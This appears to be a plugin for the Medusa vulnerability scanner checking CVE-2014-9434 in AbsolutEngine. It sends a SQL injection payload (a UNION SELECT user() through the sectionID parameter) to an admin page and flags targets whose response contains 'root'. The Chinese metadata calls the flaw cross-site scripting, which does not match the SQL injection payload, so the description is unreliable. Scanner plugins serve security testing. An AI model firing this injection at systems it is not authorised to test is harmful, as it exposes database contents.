#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import urllib.parse
from ClassCongregation import VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2014-9434" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Trans"  # 插件作者
        self.info['create_date']  = "2020-1-12"  # 插件编辑时间
        self.info['disclosure']='2015-01-10'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "AbsolutEngineXSS"  # 插件名称
        self.info['name'] ='AbsolutEngine跨站脚本漏洞' #漏洞名称
        self.info['affects'] = "AbsolutEngine"  # 漏洞组件
        self.info['desc_content'] = "AbsolutEngine存在跨站脚本漏洞。由于程序未能充分过滤用户提供的输入。攻击者可以利用漏洞来窃取基于cookie的认证证书。"  # 漏洞描述
        self.info['rank'] = "低危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "1.73"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def UrlProcessing(url):
    if url.startswith("http"):
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s'% url)

    return res.scheme, res.hostname, res.port

def medusa(Url, RandomAgent, UnixTimestamp):
    sheme, url, port = UrlProcessing(Url)
    if port is None and sheme == 'https':
        port = 443
    elif port is None and sheme == 'http':
        port = 80
    else :
        port = port

    try:
        payload = "/admin/managersection.php?&username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7&sectionID=1%27+and+1=2+union+select+1,user(),3,4,5,6+--+"
        payload_url = sheme + "://" + url + ":" + str(port) + payload

        headers = {
            'User-Agent' : RandomAgent,
            'Content-Type' : 'application/x-www-form-urlencoded',
            'Accept' : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            }

        s = requests.session()
        resp = s.get(payload_url,headers = headers, verify = False, timeout = 6)
        con = resp.text
        code=resp.status_code
        if con.find("root")!=-1 and code==200:
            Medusa = "{}存在AbsolutEngine跨站脚本漏洞\r\n 验证数据:\r\nUrl:{}\r\nPayload:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url, UnixTimestamp).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名

